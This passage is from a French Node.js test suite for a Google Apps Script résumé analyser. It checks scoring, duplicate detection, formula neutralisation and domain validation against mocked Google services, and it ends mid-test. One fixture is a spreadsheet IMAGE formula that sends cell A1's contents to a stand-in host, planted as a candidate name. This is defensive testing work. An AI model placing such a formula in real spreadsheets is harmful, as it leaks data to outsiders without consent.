/**
 * Analyseur de CV — banc d'essai.
 *
 *     node banc/test.js
 *
 * Les `.gs` sont chargés, dans l'ordre alphabétique de l'éditeur, dans un
 * contexte Node où Sheets, Drive, Gemini et les autres services sont simulés
 * (`banc/faux-google.js`). Chaque défaut corrigé en v1.0 a ici le cas qui
 * l'aurait attrapé ; la mention « Défaut v0 » le signale.
 */

'use strict';

// Avant toute création de Date : le fuseau du script est Europe/Paris.
process.env.TZ = 'Europe/Paris';

const fs = require('fs');
const path = require('path');
const vm = require('vm');
const assert = require('assert');
const { installerFauxGoogle, MIME_PDF, MIME_DOC } = require('./faux-google');

const RACINE = path.join(__dirname, '..');
const FICHIERS_GS = fs.readdirSync(RACINE).filter((n) => n.endsWith('.gs')).sort();
const PROMPTS_HISTORIQUES = JSON.parse(fs.readFileSync(path.join(__dirname, 'prompts-historiques.json'), 'utf8'));
const MIME_DOCX = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document';

const cas = [];
const test = (nom, fn) => cas.push({ nom, fn });

/* ------------------------------ Chargement ------------------------------ */

const charger = (options = {}, ordre = FICHIERS_GS) => {
  const sandbox = { console };
  vm.createContext(sandbox);
  const DateContexte = vm.runInContext('Date', sandbox);
  const g = installerFauxGoogle(sandbox, { racine: RACINE, DateContexte, options });
  ordre.forEach((nom) => {
    vm.runInContext(fs.readFileSync(path.join(RACINE, nom), 'utf8'), sandbox, { filename: nom });
  });
  // Les `const` globales ne sont pas des propriétés du bac à sable : runInContext.
  const f = (nom) => vm.runInContext(nom, sandbox);
  return { sandbox, g, f };
};

/* ------------------------------ Jeu de données ------------------------------ */

const GRILLE = [
  { critere: 'Python en production', niveau: 'Indispensable', precisions: '3 ans minimum' },
  { critere: 'SQL', niveau: 'Important', precisions: '' },
  { critere: 'Docker', niveau: 'Important', precisions: '' },
  { critere: 'Anglais professionnel', niveau: 'Souhaitable', precisions: '' },
];
const STATUT_LETTRE = { S: 'Satisfait', P: 'Partiel', N: 'Non démontré' };

/** Un CV simulé : son contenu est le profil que le faux Gemini « lit ». */
const cv = (id, nom, email, telephone, statuts, extra = {}) => ({
  id,
  nom: extra.nomFichier || `${id}.pdf`,
  mime: extra.mime || MIME_PDF,
  cree: extra.cree,
  contenu: JSON.stringify({
    nom,
    email,
    telephone,
    criteres: Object.fromEntries(GRILLE.map((c, i) => [c.critere, STATUT_LETTRE[statuts[i]]])),
    ...(extra.profil || {}),
  }),
});

const FORMULE = '=IMAGE("https://exemple.invalid/pixel?fuite="&A1)';

/**
 * Poids 3, 2, 2, 1 (total 8). SSSS = 100 ; SSSN = 88 ; SPSS = 88 ; SSPN = 75 ;
 * SSNN = 63 ; PSSS = 81 mais indispensable partiel ; NSSS = refus ; SNNN = 38.
 */
const DOSSIER = () => [
  cv('cv01', 'Alice Martin', 'alice@ex.fr', '0611111111', 'SSSS'),
  cv('cv02', 'Bruno Petit', 'bruno@ex.fr', '0622222222', 'SSPN'),
  cv('cv03', 'Chloé Durand', 'chloe@ex.fr', '0633333333', 'SSSN'),
  cv('cv04', 'David Leroy', 'david@ex.fr', '0644444444', 'SPSS'),
  cv('cv05', 'Emma Roux', 'emma@ex.fr', '0655555555', 'SSNN'),
  cv('cv06', 'Farid Nour', '', '', 'NSSS'),
  cv('cv07', 'MARTIN Alice', ' ALICE@EX.FR ', '+33 6 11 11 11 11', 'SSPN'),
  cv('cv08', FORMULE, 'pixel@ex.fr', '0600000008', 'SNNN'),
  cv('cv09', 'Gilles Faure', 'gilles@ex.fr', '06 77 77 77 77', 'PSSS', { mime: MIME_DOC, nomFichier: 'CV Gilles' }),
  cv('cv10', 'Hélène Blanc', 'helene@ex.fr', '0610101010', 'SSSS', { mime: MIME_DOCX, nomFichier: 'cv10.docx' }),
  cv('cv11', 'Ines Garcia', 'cabinet@agence.fr', '0199999999', 'SSSS'),
  cv('cv12', 'Jules Moreau', 'cabinet@agence.fr', '0199999999', 'SSSN'),
  cv('cv13', 'Chloé Durand', 'chloe.durand@autre.fr', '0688888888', 'SNNN'),
  cv('cv14', 'Karim Saidi', 'Non renseigné', 'Non renseigné', 'SSSS'),
  cv('cv15', 'Léa Simon', 'Non renseigné', 'Non renseigné', 'SSSN'),
  cv('cv16', 'Marc Vidal', 'marc@ex.fr', '0616161616', 'SSSS', { profil: { http: 500 } }),
  cv('cv17', 'Nina Lopez', 'nina@ex.fr', '0617171717', 'SSSS', { profil: { oublier: ['SQL'] } }),
];

const URL_DOSSIER = 'https://drive.google.com/drive/folders/dossier-cv-0000000000000000000000';
const ID_DOSSIER = 'dossier-cv-0000000000000000000000';

/** Classeur installé, configuré, grille proposée, dossier posé. */
const installer = (options = {}) => {
  const env = charger({ grilleProposee: GRILLE, ...options });
  const { g, f } = env;
  g.proprietes.script.setProperty('GEMINI_API_KEY', 'AIzaCleDeTest0123456789');
  g.ajouterDossier(ID_DOSSIER, options.dossier || DOSSIER());
  f('setupSheets')();
  const reglage = f('saveConfig')({
    folderUrl: URL_DOSSIER,
    jobDescription: 'Développeur Python confirmé. Python exigé (3 ans), SQL, Docker, anglais apprécié.',
    model: 'gemini-3.7-flash',
    accountType: options.compte || 'Payant (Pay-as-you-go)',
    criteria: 'Une alternance compte comme expérience professionnelle.',
    seuilContact: 70,
    seuilVivier: 40,
    placesContact: options.places || 3,
  });
  assert.ok(reglage.ok, reglage.message);
  if (options.grille !== false) f('proposerGrilleEvaluation')();
  return env;
};

/* ------------------------------ Lecture de l'onglet ------------------------------ */

const feuilleResultats = (g) => g.classeur.getSheetByName("Résultats de l'analyse");
const feuilleGrille = (g) => g.classeur.getSheetByName("Grille d'évaluation");

/** Lignes de l'onglet Résultats, indexées par en-tête — lues par l'API simulée, comme le code. */
const lignes = (g) => {
  const feuille = feuilleResultats(g);
  const largeur = feuille.getLastColumn();
  const entete = feuille.getRange(3, 1, 1, largeur).getValues()[0].map(String);
  const derniere = feuille.getLastRow();
  if (derniere < 4) return [];
  return feuille.getRange(4, 1, derniere - 3, largeur).getValues().map((cellules, i) => {
    const ligne = { numero: 4 + i };
    entete.forEach((nom, c) => { if (nom && !(nom in ligne)) ligne[nom] = cellules[c]; });
    return ligne;
  });
};
const parId = (g) => Object.fromEntries(lignes(g).map((l) => [l['ID fichier'], l]));
const evaluationsEnvoyees = (g) => g.journal.requetesGemini.filter((r) => r.doc);
const derniereAlerte = (g) => g.journal.alertes[g.journal.alertes.length - 1];

/** Écrit dans la grille comme l'équipe RH : cellule par cellule, dans l'onglet. */
const ecrireGrille = (g, lignesGrille) => {
  const feuille = feuilleGrille(g);
  const derniere = Math.max(feuille.getLastRow(), 1);
  if (derniere > 1) feuille.getRange(2, 1, derniere - 1, 4).setValues(Array.from({ length: derniere - 1 }, () => ['', '', '', '']));
  if (lignesGrille.length) feuille.getRange(2, 1, lignesGrille.length, 4).setValues(lignesGrille);
};
const GRILLE_LIGNES = GRILLE.map((c) => [c.critere, c.niveau, '', c.precisions]);

/* =============================== Cas unitaires =============================== */

test('Chargement : le projet se charge quel que soit l\'ordre des fichiers', () => {
  // Défaut attrapé en cours de v1.0 : Classement.gs, chargé avant Constants.gs,
  // lisait RECOMMANDATIONS au niveau supérieur — et tout le projet échouait.
  const ordres = [
    [...FICHIERS_GS].reverse(),
    [...FICHIERS_GS.slice(3), ...FICHIERS_GS.slice(0, 3)],
    [...FICHIERS_GS.filter((n) => n !== 'Constants.gs'), 'Constants.gs'],
  ];
  ordres.forEach((ordre) => {
    const { f } = charger({}, ordre);
    assert.strictEqual(typeof f('classerFiches_'), 'function', ordre.join(', '));
    assert.strictEqual(f('rangGroupe_')('À contacter'), 1);
  });
});

test('Version : la constante vaut le fichier VERSION', () => {
  const { f } = charger();
  assert.strictEqual(f('ANALYSEUR_CV_VERSION'), fs.readFileSync(path.join(RACINE, 'VERSION'), 'utf8').trim());
});

test('Empreinte SHA-256 : octets signés convertis (vecteur « abc »)', () => {
  const { f } = charger();
  assert.strictEqual(f('empreinteTexte_')('abc'), 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');
});

test('Défaut v0 : le prompt par défaut figé dans les réglages est reconnu, sous ses cinq versions', () => {
  const { f } = charger();
  const estDefaut = f('estPromptParDefaut_');
  assert.ok(PROMPTS_HISTORIQUES.length === 5, 'jeu des prompts historiques incomplet');
  PROMPTS_HISTORIQUES.forEach(({ commit, texte }) => {
    assert.ok(estDefaut(texte), `prompt historique ${commit} non reconnu`);
    assert.ok(estDefaut(`  ${texte.replace(/\n/g, '\r\n')}  `), `prompt historique ${commit} non reconnu après retouche d'espaces`);
  });
  assert.ok(estDefaut(''));
  assert.ok(estDefaut(f('DEFAULT_PROMPT')));
  assert.ok(!estDefaut(PROMPTS_HISTORIQUES[0].texte.replace('Recruteur Senior', 'Recruteur')), 'un prompt retouché à la main doit être conservé');
});

test('Clés d\'identité : email, téléphone et nom normalisés ; les valeurs vides ne désignent personne', () => {
  const { f } = charger();
  const tel = f('cleTelephone_');
  ['06 12 34 56 78', '+33 6 12 34 56 78', '0033612345678', '06.12.34.56.78', 612345678].forEach((v) => {
    assert.strictEqual(tel(v), '612345678', `téléphone ${v}`);
  });
  ['Non renseigné', '', '1234', null].forEach((v) => assert.strictEqual(tel(v), null, `téléphone ${v}`));
  const mail = f('cleEmail_');
  assert.strictEqual(mail(' Jean.Dupont@Exemple.FR '), 'jean.dupont@exemple.fr');
  ['Non renseigné', '', 'jean@', 'Pseudonymisé'].forEach((v) => assert.strictEqual(mail(v), null, `email ${v}`));
  const nom = f('cleNom_');
  assert.strictEqual(nom('DUPONT Jean'), nom('Jean Dupont'));
  assert.strictEqual(nom('Chloé Durand'), nom('chloe DURAND'));
  ['Inconnu', "Erreur d'analyse", 'Pseudonymisé', 'Jean', ''].forEach((v) => assert.strictEqual(nom(v), null, `nom ${v}`));
  assert.ok(f('nomsCompatibles_')(nom('Jean Dupont'), nom('Jean Dupont-Martin')));
  assert.ok(!f('nomsCompatibles_')(nom('Ines Garcia'), nom('Jules Moreau')));
});

/** Grille « fabriquée » pour les cas unitaires : poids 3, 2, 2, 1. */
const grilleUnitaire = (f) => GRILLE.map((c, i) => {
  const cle = f('cleCritere_')(c.critere);
  return { code: `C${i + 1}`, cle, texte: c.critere, niveau: c.niveau, poids: [3, 2, 2, 1][i], precisions: c.precisions, empreinte: f('empreinteCritere_')(cle, c.precisions) };
});
const evaluations = (criteres, lettres) => Object.fromEntries(criteres.map((c, i) => [c.cle, { statut: STATUT_LETTRE[lettres[i]], preuve: 'extrait', empreinte: c.empreinte }]));

test('Score : moyenne pondérée, calcul affiché', () => {
  const { f } = charger();
  const criteres = grilleUnitaire(f);
  const r = f('scorerEvaluations_')(criteres, evaluations(criteres, 'SSPN'));
  assert.strictEqual(r.score, 75);
  assert.ok(r.calcul.includes('100 × (3×1 + 2×1 + 2×0,5 + 1×0) ÷ 8 = 75'), r.calcul);
  assert.ok(!f('scorerEvaluations_')(criteres.slice(1).concat(criteres[0]), {}).complet, 'un critère sans évaluation n\'est pas « non démontré »');
});

test('Défaut v1.0.0 : un indispensable absent du CV plafonne au vivier « à vérifier », il ne fait pas refuser', () => {
  // Premier essai réel : un profil solide, muet sur son niveau d'anglais
  // (indispensable), était refusé. « Non démontré » veut dire « le CV n'en dit
  // rien », pas « le candidat ne l'a pas ».
  const { f } = charger();
  const criteres = grilleUnitaire(f);
  const reglages = { seuilContact: 70, seuilVivier: 40, placesContact: 10 };
  const base = (lettres) => f('recommandationDeBase_')(f('scorerEvaluations_')(criteres, evaluations(criteres, lettres)), reglages);
  const muet = base('NSSS');
  assert.strictEqual(muet.recommandation, 'À garder en vivier');
  assert.ok(muet.motif.includes('non démontré par le CV (Python en production)') && muet.motif.includes('à vérifier'), muet.motif);
  // Jamais « À contacter » sans les indispensables, même avec un score au-dessus du seuil.
  const criteresLegers = criteres.map((c, i) => (i === 0 ? { ...c, poids: 0.5 } : c));
  const fort = f('recommandationDeBase_')(f('scorerEvaluations_')(criteresLegers, evaluations(criteresLegers, 'NSSS')), reglages);
  assert.ok(fort.recommandation === 'À garder en vivier', `${fort.recommandation} ; ${fort.motif}`);
  // Le refus ne vient que du score.
  const faible = base('NNNS');
  assert.strictEqual(faible.recommandation, 'À refuser');
  assert.ok(faible.motif.startsWith('Score 13 < seuil de vivier 40.') && faible.motif.includes('En outre'), faible.motif);
});

test('Recommandation par seuils absolus : un partiel plafonne au vivier, le refus vient du score', () => {
  const { f } = charger();
  const criteres = grilleUnitaire(f);
  const reglages = { seuilContact: 70, seuilVivier: 40, placesContact: 10 };
  const reco = (lettres) => f('recommandationDeBase_')(f('scorerEvaluations_')(criteres, evaluations(criteres, lettres)), reglages).recommandation;
  assert.strictEqual(reco('PSSS'), 'À garder en vivier');
  assert.strictEqual(reco('SSSN'), 'À contacter');
  assert.strictEqual(reco('SSNN'), 'À garder en vivier');
  assert.strictEqual(reco('SNNN'), 'À refuser');
  const auSeuil = f('recommandationDeBase_')({ score: 70, indispensablesNonDemontres: [], indispensablesPartiels: [], aDesIndispensables: true }, reglages);
  assert.strictEqual(auSeuil.recommandation, 'À contacter', 'le seuil est inclusif');
});

/** Fiches de classement fabriquées : une par profil. */
const fiches = (f, criteres, empreinte, profils) => profils.map((p, i) => ({
  id: p.id || `f${i}`,
  nom: p.nom || `Candidat Numero${i}`,
  email: p.email || `c${i}@ex.fr`,
  telephone: p.telephone || `06000000${String(i).padStart(2, '0')}`,
  fichier: `f${i}.pdf`,
  date: p.date || (1000 + i),
  referentiel: p.referentiel || empreinte,
  evaluations: evaluations(criteres, p.lettres),
  recommandation: '',
  motif: '',
  score: '',
  detail: '',
}));

test('Défaut v0 : les places sont un maximum — 4 candidats au-dessus du seuil donnent 4 « À contacter », pas 10', () => {
  const { f } = charger();
  const criteres = grilleUnitaire(f);
  const profils = [...Array(4).fill({ lettres: 'SSSN' }), ...Array(21).fill({ lettres: 'SSNN' })];
  const sorties = f('classerFiches_')(fiches(f, criteres, 'r1-x', profils), criteres, { seuilContact: 70, seuilVivier: 40, placesContact: 10 }, 'r1-x');
  assert.strictEqual(sorties.filter((s) => s.recommandation === 'À contacter').length, 4);
  assert.strictEqual(sorties.filter((s) => s.recommandation === 'À garder en vivier').length, 21, 'aucun repêchage du vivier');
});

test('Places : au-delà de N, passage en vivier avec rang ; ex æquo départagé et dit', () => {
  const { f } = charger();
  const criteres = grilleUnitaire(f);
  const profils = [...Array(11).fill({ lettres: 'SSSS' }), { lettres: 'SSSN' }];
  const sorties = f('classerFiches_')(fiches(f, criteres, 'r1-x', profils), criteres, { seuilContact: 70, seuilVivier: 40, placesContact: 10 }, 'r1-x');
  assert.strictEqual(sorties.filter((s) => s.recommandation === 'À contacter').length, 10);
  const onzieme = sorties[10];
  assert.strictEqual(onzieme.recommandation, 'À garder en vivier');
  assert.ok(onzieme.motif.includes('Au-delà des 10 places') && onzieme.motif.includes('rang 11 sur 12'), onzieme.motif);
  assert.ok(onzieme.motif.includes('ex æquo'), 'le départage d\'une égalité doit être dit');
  assert.ok(!sorties[11].motif.includes('ex æquo'), 'le 12e, moins bien noté, n\'est pas ex æquo');
});

test('Défaut v0 : un doublon ne prend pas de place ; la fiche retenue est la mieux notée', () => {
  const { f } = charger();
  const criteres = grilleUnitaire(f);
  const profils = [
    { lettres: 'SSPN', email: 'jean@ex.fr', nom: 'Jean Dupont' },
    { lettres: 'SSSS', email: 'JEAN@ex.fr', nom: 'DUPONT Jean', telephone: '0699999999' },
    ...Array(10).fill(null).map(() => ({ lettres: 'SSSN' })),
  ];
  const sorties = f('classerFiches_')(fiches(f, criteres, 'r1-x', profils), criteres, { seuilContact: 70, seuilVivier: 40, placesContact: 10 }, 'r1-x');
  assert.strictEqual(sorties[0].recommandation, 'Doublon');
  assert.strictEqual(sorties[1].recommandation, 'À contacter');
  assert.ok(sorties[1].doublon.startsWith('Fiche retenue'));
  assert.strictEqual(sorties.filter((s) => s.recommandation === 'À contacter').length, 10);
});

test('Doublons : « Non renseigné » ne relie personne ; une adresse de cabinet partagée n\'écarte personne', () => {
  const { f } = charger();
  const criteres = grilleUnitaire(f);
  const profils = [
    { lettres: 'SSSS', email: 'Non renseigné', telephone: 'Non renseigné', nom: 'Karim Saidi' },
    { lettres: 'SSSS', email: 'Non renseigné', telephone: 'Non renseigné', nom: 'Léa Simon' },
    { lettres: 'SSSS', email: 'cabinet@agence.fr', telephone: '0199999999', nom: 'Ines Garcia' },
    { lettres: 'SSSN', email: 'cabinet@agence.fr', telephone: '0199999999', nom: 'Jules Moreau' },
  ];
  const sorties = f('classerFiches_')(fiches(f, criteres, 'r1-x', profils), criteres, { seuilContact: 70, seuilVivier: 40, placesContact: 10 }, 'r1-x');
  assert.ok(sorties.every((s) => s.recommandation === 'À contacter'), JSON.stringify(sorties.map((s) => s.recommandation)));
  assert.strictEqual(sorties[0].doublon, '');
  assert.ok(sorties[2].doublon.startsWith('À vérifier : même email ou téléphone'));
});

test('Référentiel : critère retiré = rien à refaire ; critère ajouté = à réanalyser, motif nommé', () => {
  const { f } = charger();
  const criteres = grilleUnitaire(f);
  const lot = fiches(f, criteres, 'r1-x', [{ lettres: 'SSSS' }]);
  const reglages = { seuilContact: 70, seuilVivier: 40, placesContact: 10 };
  const sansAnglais = criteres.slice(0, 3);
  assert.strictEqual(f('classerFiches_')(lot, sansAnglais, reglages, 'r1-x')[0].recommandation, 'À contacter');
  const cle = f('cleCritere_')('Kubernetes');
  const avecKube = [...criteres, { code: 'C5', cle, texte: 'Kubernetes', niveau: 'Souhaitable', poids: 1, precisions: '', empreinte: f('empreinteCritere_')(cle, '') }];
  const sortie = f('classerFiches_')(lot, avecKube, reglages, 'r1-x')[0];
  assert.strictEqual(sortie.recommandation, 'À réanalyser');
  assert.strictEqual(sortie.score, '', 'un score non mesuré reste vide');
  assert.ok(sortie.motif.includes('Kubernetes'), sortie.motif);
  assert.strictEqual(f('classerFiches_')(lot, criteres, reglages, 'r1-autre')[0].recommandation, 'À réanalyser');
});

test('Empreinte du référentiel : jamais numérique, pour ne pas être convertie par Sheets', () => {
  const { f, g } = charger();
  const empreinte = f('empreinteReferentiel_')({ annonce: 'a', consignes: '', prompt: 'p', modele: 'm' });
  assert.match(empreinte, /^r1-[0-9a-f]{12}$/);
  const feuille = g.classeur.insertSheet('Essai');
  feuille.getRange(1, 1).setValues([[empreinte]]);
  assert.strictEqual(feuille.getRange(1, 1).getValues()[0][0], empreinte);
  // Le piège qu'évite le préfixe : une empreinte faite de chiffres revient en nombre.
  feuille.getRange(2, 1).setValues([['012345678901']]);
  assert.strictEqual(typeof feuille.getRange(2, 1).getValues()[0][0], 'number');
});

test('Formules : toute chaîne venue d\'un CV est neutralisée', () => {
  const { f } = charger();
  const n = f('neutraliserFormule_');
  assert.strictEqual(n(FORMULE), `'${FORMULE}`);
  assert.strictEqual(n('+33 6 12'), "'+33 6 12");
  assert.strictEqual(n('-accueil'), "'-accueil");
  assert.strictEqual(n('Jean'), 'Jean');
  assert.strictEqual(n(42), 42);
});

test('Analyse JSON : objets imbriqués sur trois niveaux, texte autour', () => {
  const { f } = charger();
  const p = f('parseJsonSafely');
  assert.deepStrictEqual(JSON.parse(JSON.stringify(p('{"a":{"b":{"c":1}},"d":"x}y"}'))), { a: { b: { c: 1 } }, d: 'x}y' });
  assert.deepStrictEqual(JSON.parse(JSON.stringify(p('```json\n{"a":1}\n```'))), { a: 1 });
  assert.deepStrictEqual(JSON.parse(JSON.stringify(p('Voici : {"a":{"b":2}} fin'))), { a: { b: 2 } });
  assert.throws(() => p('invalide'));
});

test('Reprises de l\'ancien Test.gs : URL de dossier, domaines autorisés, état du travail', () => {
  const { f } = charger();
  const id = f('getFolderIdFromUrl');
  assert.strictEqual(id('https://drive.google.com/drive/folders/abc1234567890abcdefghijklmno123456'), 'abc1234567890abcdefghijklmno123456');
  assert.strictEqual(id('abc1234567890abcdefghijklmno123456'), 'abc1234567890abcdefghijklmno123456');
  assert.strictEqual(id('invalid'), null);
  const autorises = 'linkedin.com, indeed.com';
  assert.ok(f('isDomainAllowed')('jobs.indeed.com', autorises));
  assert.ok(!f('isDomainAllowed')('evil-linkedin.com', autorises));
  assert.ok(!f('isDomainAllowed')('linkedin.com.evil.com', autorises));
  assert.strictEqual(f('extractDomainFromUrl')('https://linkedin.com@evil.example/offre'), null);
  assert.strictEqual(f('extractDomainFromUrl')('https://jobs.indeed.com:443/viewjob?id=1'), 'jobs.indeed.com');
  const etat = f('mergeJobState')({ status: 'RUNNING', total: 20 }, { processed: 5 }, 42);
  assert.strictEqual(etat.total, 20);
  assert.strictEqual(etat.processed, 5);
  assert.strictEqual(etat.lastUpdated, 42);
});

test('Nombres et accords en français', () => {
  const { f } = charger();
  assert.strictEqual(f('formaterNombre_')(0.5), '0,5');
  assert.strictEqual(f('formaterNombre_')(3), '3');
  assert.strictEqual(f('accorder_')(1, 'brouillon'), '1 brouillon');
  assert.strictEqual(f('accorder_')(0, 'brouillon'), '0 brouillon');
  assert.strictEqual(f('accorder_')(2, 'CV évalué', 'CV évalués'), '2 CV évalués');
});

/* =============================== Configuration =============================== */

test('Configuration : annonce au-delà de 9 Ko refusée avec un remède, pas avec l\'erreur brute de Google', () => {
  const { f } = charger();
  const r = f('saveConfig')({ jobDescription: 'é'.repeat(5000) });
  assert.ok(!r.ok);
  assert.ok(r.message.includes('9 Ko') && r.message.includes('URL'), r.message);
});

test('Configuration : seuils incohérents refusés ; prompt historique stocké comme « défaut »', () => {
  const { f, g } = charger();
  assert.ok(!f('saveConfig')({ seuilContact: 50, seuilVivier: 60 }).ok);
  assert.ok(!f('saveConfig')({ placesContact: 0 }).ok);
  assert.ok(f('saveConfig')({ systemPrompt: PROMPTS_HISTORIQUES[0].texte }).ok);
  assert.strictEqual(g.proprietes.document.getProperty('CFG_SYSTEM_PROMPT'), '');
  const invalide = f('saveConfig')({ systemPrompt: 'Évalue ce CV.' });
  assert.ok(!invalide.ok && invalide.message.includes('{{CRITERIA}}'));
});

test('Défaut v0 : une annonce en 403 donne le message prévu, pas l\'exception brute d\'UrlFetchApp', () => {
  const url = 'https://www.linkedin.com/jobs/view/1';
  const { f } = charger({ pagesWeb: { [url]: { code: 403, corps: 'Interdit' } } });
  assert.throws(() => f('fetchJobDescription')(url, 'linkedin.com'), /Accès refusé par le site \(HTTP 403\)/);
});

test('Annonce par URL : lue et résumée une seule fois, puis mémorisée', () => {
  const url = 'https://www.indeed.com/offre/42';
  const page = `<html><body>${'Poste de développeur. Profil recherché : expérience Python, missions variées, compétences SQL. '.repeat(5)}</body></html>`;
  const { f, g } = charger({ pagesWeb: { [url]: { code: 200, corps: page } } });
  g.proprietes.document.setProperty('CFG_JOB_DESCRIPTION', url);
  const config = f('getConfig')();
  const premier = f('annonceDeReference_')(config, 'cle', 'gemini-3.7-flash', false);
  const second = f('annonceDeReference_')(config, 'cle', 'gemini-3.7-flash', false);
  assert.strictEqual(premier, second);
  assert.strictEqual(g.journal.requetesWeb.length, 1, 'la page ne doit être lue qu\'une fois');
});

/* =============================== Parcours complet =============================== */

test('Grille vide : l\'analyse refuse de partir et dit quoi faire, sans appeler Gemini', () => {
  const { f, g } = installer({ grille: false });
  f('analyzeCVs')();
  assert.ok(derniereAlerte(g).message.includes("La grille d'évaluation est vide"), derniereAlerte(g).message);
  assert.strictEqual(g.journal.requetesGemini.length, 0);
  const panneau = f('startAnalysisFromSidebar')(null);
  assert.ok(!panneau.ok && panneau.message.includes('grille'), panneau.message);
});

test('Proposition de grille : dans l\'onglet vide sans question ; sur une grille remplie, seulement après confirmation', () => {
  const { f, g } = installer();
  const grille = f('lireGrille_')();
  assert.strictEqual(grille.criteres.length, 4);
  assert.strictEqual(grille.criteres[0].poids, 3, 'poids par défaut écrit pour être vu');
  assert.ok(derniereAlerte(g).message.includes('dont 1 indispensable'), derniereAlerte(g).message);
  // L'équipe retouche un poids, puis redemande une proposition.
  ecrireGrille(g, GRILLE_LIGNES.map((l, i) => (i === 0 ? [l[0], l[1], 5, l[3]] : l)));
  const appelsAvant = g.journal.requetesGemini.length;
  g.repondre('NO');
  f('proposerGrilleEvaluation')();
  const question = g.journal.alertes.find((a) => a.titre === 'Remplacer la grille ?');
  assert.ok(question && question.message.includes('réanalysés'), 'le coût du remplacement est dit avant');
  assert.strictEqual(f('lireGrille_')().criteres[0].poids, 5, 'refusé : rien ne change');
  assert.strictEqual(g.journal.requetesGemini.length, appelsAvant, 'refusé : aucun appel à Gemini');
  g.repondre('YES');
  f('proposerGrilleEvaluation')();
  assert.strictEqual(f('lireGrille_')().criteres.length, 4, 'remplacée, pas ajoutée à la suite');
  assert.strictEqual(f('lireGrille_')().criteres[0].poids, 3);
  // Panneau : sans confirmation, rien n'est écrit et la réponse le demande.
  const reponse = f('proposerGrilleDepuisPanneau')(null);
  assert.ok(!reponse.ok && reponse.confirmer === true, JSON.stringify(reponse));
});

const analyserTout = (env) => {
  env.f('analyzeCVs')();
  return lignes(env.g);
};

test('Analyse complète : places, doublons, présomptions, formules, erreurs et tri', () => {
  const env = installer();
  const { g } = env;
  const toutes = analyserTout(env);
  const l = parId(g);

  assert.strictEqual(toutes.length, 17, 'une ligne par fichier');
  // Places : 3 au plus, les mieux notés ; l'ex æquo tranché est dit.
  const contacts = toutes.filter((x) => x.Recommandation === 'À contacter');
  assert.strictEqual(contacts.length, 3);
  assert.ok(contacts.every((x) => x['Score / 100'] === 100), JSON.stringify(contacts.map((x) => x['Score / 100'])));
  const centsEnVivier = toutes.filter((x) => x['Score / 100'] === 100 && x.Recommandation === 'À garder en vivier');
  assert.strictEqual(centsEnVivier.length, 1);
  assert.ok(centsEnVivier[0]['Motif de la recommandation'].includes('ex æquo'));

  // Doublon certain : même email (casse et espaces), téléphone international.
  assert.strictEqual(l.cv07.Recommandation, 'Doublon');
  assert.ok(l.cv07.Doublon.startsWith('Même email que la fiche retenue : Alice Martin'), l.cv07.Doublon);
  assert.ok(l.cv01.Doublon.startsWith('Fiche retenue'), l.cv01.Doublon);
  // Cabinet : même adresse, noms différents → signalé, rien d'écarté.
  assert.notStrictEqual(l.cv11.Recommandation, 'Doublon');
  assert.notStrictEqual(l.cv12.Recommandation, 'Doublon');
  assert.ok(l.cv12.Doublon.startsWith('À vérifier : même email ou téléphone'), l.cv12.Doublon);
  // Homonyme sans coordonnée commune → présomption seulement.
  assert.ok(l.cv13.Doublon.includes('À vérifier : même nom'), l.cv13.Doublon);
  assert.strictEqual(l.cv13.Recommandation, 'À refuser');
  // Sans coordonnées : personne n'est relié.
  assert.strictEqual(l.cv14.Doublon, '');
  assert.strictEqual(l.cv15.Doublon, '');

  // Indispensable non démontré ou partiel → vivier, « à vérifier » ; jamais de refus pour un CV muet.
  assert.strictEqual(l.cv06.Recommandation, 'À garder en vivier');
  assert.ok(l.cv06['Motif de la recommandation'].includes('Indispensable non démontré par le CV (Python en production)'), l.cv06['Motif de la recommandation']);
  assert.strictEqual(l.cv09.Recommandation, 'À garder en vivier');
  assert.ok(l.cv09['Motif de la recommandation'].includes('démontré en partie'));

  // Formule venue d'un CV : relue comme texte.
  assert.strictEqual(l.cv08.Candidat, FORMULE);
  // Téléphone gardé en texte, zéro initial compris.
  assert.strictEqual(l.cv01['Téléphone'], '0611111111');
  // Google Doc et DOCX analysés.
  assert.strictEqual(l.cv09.Candidat, 'Gilles Faure');
  assert.strictEqual(l.cv10['Score / 100'], 100);

  // Erreurs : HTTP 500 et réponse incomplète, avec leur motif.
  assert.strictEqual(l.cv16.Recommandation, 'Erreur');
  assert.ok(l.cv16['Motif de la recommandation'].includes('Erreur simulée 500'));
  assert.strictEqual(l.cv17.Recommandation, 'Erreur');
  assert.ok(l.cv17['Motif de la recommandation'].includes('Réponse incomplète'), l.cv17['Motif de la recommandation']);
  assert.strictEqual(l.cv17['Score / 100'], '', 'une erreur n\'a pas de score');

  // Détail du score : critère, niveau, poids, extrait, calcul.
  assert.ok(l.cv02['Détail du score'].includes('◐ Docker (important, poids 2) — « Extrait du CV sur Docker »'), l.cv02['Détail du score']);
  assert.ok(l.cv02['Détail du score'].endsWith('= 75'));
  // Référentiel : relu à l'identique.
  assert.ok(toutes.filter((x) => x.Recommandation !== 'Erreur').every((x) => /^r1-/.test(x['Référentiel'])));

  // Tri : l'ordre suit les groupes, les contacts en tête.
  const ordres = toutes.map((x) => x.Ordre);
  assert.deepStrictEqual(ordres, [...ordres].sort((a, b) => a - b));
  assert.strictEqual(toutes[0].Recommandation, 'À contacter');

  // Requêtes : grille et date dans l'évaluation ; aucun nom dans la synthèse.
  const evaluation = evaluationsEnvoyees(g)[0];
  assert.ok(evaluation.textes[0].includes('C1. Python en production — Précisions : 3 ans minimum'));
  assert.ok(evaluation.textes[0].includes('Une alternance compte comme expérience professionnelle.'));
  assert.ok(!evaluation.textes[0].includes('Indispensable'), 'le niveau n\'est pas montré à l\'IA');
  assert.ok(evaluation.textes[1].startsWith('Date du jour :'));
  const synthese = g.journal.requetesGemini.find((r) => r.textes.join(' ').includes('résumé des candidats'));
  assert.ok(synthese, 'synthèse demandée');
  ['Alice', 'Bruno', 'Chloé'].forEach((nom) => assert.ok(!synthese.textes.join(' ').includes(nom), `le nom ${nom} est parti dans la synthèse`));

  // Bilan : dit qu'il n'y a pas de repêchage et compte les doublons.
  assert.ok(derniereAlerte(g).message.includes('3 candidats à contacter'), derniereAlerte(g).message);
  assert.ok(derniereAlerte(g).message.includes('1 doublon écarté'), derniereAlerte(g).message);
});

test('Relance : seuls les fichiers en erreur repartent ; corrigés, ils sont réécrits sur leur ligne', () => {
  const env = installer();
  const { f, g } = env;
  analyserTout(env);
  const encre = (id, colonne) => {
    const feuille = feuilleResultats(g);
